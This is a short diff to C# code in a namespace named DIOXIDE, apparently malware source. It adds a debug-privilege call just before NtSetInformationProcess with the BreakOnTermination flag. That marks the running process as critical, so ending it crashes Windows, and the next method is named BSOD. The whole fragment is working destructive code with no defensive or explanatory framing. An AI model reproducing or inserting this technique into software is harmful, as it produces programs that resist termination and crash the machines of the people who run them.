@@ -161,6 +161,7 @@ namespace DIOXIDE
         {
             int isCritical = 1;
             int BreakOnTermination = 0x1D;
+            Process.EnterDebugMode();
             Win32API.NtSetInformationProcess( Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof( int ) );
         }
         public void BSOD()
